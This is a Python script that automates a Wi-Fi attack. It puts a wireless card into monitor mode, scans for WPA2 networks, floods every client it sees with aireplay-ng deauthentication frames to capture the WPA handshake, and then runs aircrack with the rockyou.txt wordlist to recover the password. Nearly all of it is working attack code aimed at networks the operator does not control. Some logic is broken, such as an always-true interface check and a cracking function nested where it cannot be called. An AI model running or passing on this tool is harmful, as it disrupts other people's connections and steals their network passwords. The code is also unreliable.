#!/usr/bin/env python

from __future__ import print_function

import os, subprocess, select, time
from multiprocessing import Process

SECONDS = 10

def check_root():

    if os.geteuid() != 0:
        print('need to be root')
        exit(0)

def setup_network():

    #out = subprocess.check_output("rm testcap*".split(" "), stderr=subprocess.STDOUT)
    #out = subprocess.check_output("rm capture*".split(" "))
    out = subprocess.check_output("airmon-ng check kill".split(" "))
    #print(out)
    out = subprocess.check_output("/etc/init.d/avahi-daemon stop".split(" "))
    #print(out)

    # Get a monitor mode network device from iwconfig
    p2 = subprocess.Popen("iwconfig".split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p2.communicate()
    result = err + out
    #print(result)
    managed = ""
    #interfaces = [r.split()[0] for r in result.split("\n\n")]
    interfaces = []
    for r in result.split("\n\n"):
        interface = r.split()[0]
        interfaces.append(interface)
        if "Managed" or "Promiscous" in r:
            managed = interface
    #print(interfaces)
    print("Using {} as the interface".format(managed))

    out = subprocess.check_output("ifconfig {} down".format(managed).split(" "))
    #print(out)
    out = subprocess.check_output("airmon-ng start {}".format(managed).split(" "))
    #print(out)
    #TODO: programmatically get the new monitor mode network
    mon_managed = managed + "mon"
    return mon_managed

def reset_network(interface_name):
    #print("Reseting network...")
    out = subprocess.check_output("airmon-ng stop {}".format(interface_name).split(" "))
    #print(out)
    out = subprocess.check_output("service network-manager restart".split(" "))
    #print(out)
    #print("Reset Network")

def send_deauth(bssid, dmac, interface_name, seconds):
    print("SECONDS: {}".format(seconds))
    print("sending {0} deauth(s) to DMAC:{1} in BSSID:{2}".format(seconds, dmac, bssid["BSSID"]))
    print("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name))
    #aireplay-ng -0 1 -a <bssid - MAC address of access point> -c <dmac - MAC address of destination> <monitor mode adapter>
    p = subprocess.Popen("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.wait()

def capture_handshake(bssid, interface_name):
    print("Capturing packets for {0} on channel {1} [BSSID: {2}]..."\
            .format(bssid["ESSID"], bssid["CH"], bssid["BSSID"]))
    print("airodump-ng -c {0} --bssid {1} -w handshake_{1} {2}".format(bssid["CH"], bssid["BSSID"], interface_name))
    p = subprocess.Popen("airodump-ng -c {0} --bssid {1} -w handshake_{1} {2}"\
            .format(bssid["CH"], bssid["BSSID"], interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    dmac_map = {}
    processes = []
    poll = select.poll()
    poll.register(p.stderr)

    out = ""
    start = time.time()
    while time.time() - start < 2:
        rlist = poll.poll()
        for fd, event in rlist:
            out += os.read(fd, 2048)

    poll.unregister(p.stderr)

    #out2arr = out.split("\n")
    out2arr = out.split("\x1b[J\x1b[1;1H\n")
    #out2arr = out.split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")
    for i in range(1, len(out2arr)):
        info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[1]
        #print(lines[4:])
        lines = info.split("\n")[2:-1]
        #print(info.strip())
        #print(lines[2:-1])
        #print(len(info))
        #print('~~~~~')
        for line in lines:
            #data = line.strip().split()
            data = line.split()
            dmac = data[1]
            #print(dmac)

            if dmac not in dmac_map:
                print("new dmac: {}".format(dmac))
                dmac_map[dmac] = True
                deauth = Process(target = send_deauth, args=(bssid, dmac, interface_name, SECONDS))
                processes.append(deauth)
                deauth.start()
                deauth.join()
    #print(out2arr)

    print('deauthing', end='')
    while len(processes) != 0:
        print('.', end='')
        """
        for i in range(len(processes)):
            process = processes[i]
            if not process.is_alive():
                processes.pop(i)
                i -= 1
        time.sleep(1)
        """
        for p in processes[:]:
            #p = processes[i]
            if not p.is_alive():
                #processes.pop(i)
                #i -= 1
                processes.remove(p)
        time.sleep(1)

    p.terminate()

def get_bssids(interface_name):
    print('getting bssids')
    p = subprocess.Popen("airodump-ng -a -w testcap {}".format(interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print('before poll')
    poll = select.poll()
    #poll.register(p.stdout)
    poll.register(p.stderr)

    print('before while loop')
    start = time.time()
    output = []
    out2 = ""
    while time.time() - start < 3:
        rlist = poll.poll()
        for fd, event in rlist:
            #print(fd, event)
            #line = os.read(fd, 1024)
            out2 += os.read(fd, 2048)
            #print(line)
            #output.append(line)

    #out2 = os.read(fd

    #poll.unregister(p.stdout)
    poll.unregister(p.stderr)
    p.terminate()

    print('end while loop')
    bssid_map = {}
    processes = []
    out2arr = out2.split("\x1b[J\x1b[1;1H\n")
    for i in range(1, len(out2arr)):
        info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[0]
        #print(lines[4:])
        lines = info.split("\n")[4:-2]
        for line in lines:
            data = line.split()

            bssid = {
                    "BSSID": data[0],
                    "Pwr": data[1],
                    "Beacons": data[2],
                    "Data": data[3],
                    "NUM_PER_S": data[4],
                    "CH": data[5],
                    "MB": data[6],
                    "ENC": data[7],
                    "CIPHER": "",
                    "AUTH": "",
            }
            if bssid["ENC"] == "WPA2":
                bssid["CIPHER"] = data[8]
                bssid["AUTH"] = data[9]
                bssid["ESSID"] = ' '.join(data[10:])
                #print(bssid["ESSID"])
            elif bssid["ENC"] == "WEP":
                bssid["CIPHER"] = data[8]
                bssid["ESSID"] = ' '.join(data[9:])
            elif bssid["ENC"] == "OPN" or bssid["ENC"] == "WPA":
                bssid["ESSID"] = data[8:]
            else:
                print("don't recognize enc type: %s" %bssid["ENC"])
                bssid["ESSID"] = ' '.join(data[8:])

            if bssid["ENC"] == "WPA2" and bssid["CH"] == "9" and bssid["BSSID"] not in bssid_map:
                bssid_map[bssid["BSSID"]] = bssid
                #handshake = Process(target = capture_handshake, args=(bssid, interface_name))
                #processes.append(handshake)
                #handshake.start()
                print(bssid["ESSID"])
                capture_handshake(bssid, interface_name)

    """
    print('capturing', end='')
    while len(processes) != 0:
        print('.', end='')
        #for i in range(len(processes)):
        for p in processes[:]:
            #p = processes[i]
            if not p.is_alive():
                #processes.pop(i)
                #i -= 1
                processes.remove(p)
        time.sleep(1)
    """

    def crack_password(bssid):
        cmd = "aircrack -w rockyou.txt -b" + bssid + " captured_packet_file_name.cap"
        subprocess.call(cmd, shell=True)


def run():
    check_root()
    os.system("rm testcap*")
    os.system("rm handshake*")
    interface = setup_network()
    try:
        get_bssids(interface)
    finally:
        time.sleep(1)
        reset_network(interface)

    bssid = raw_input("Which bssid do want the password for? ")
    crack_password(bssid)

if __name__ == "__main__":
    run()
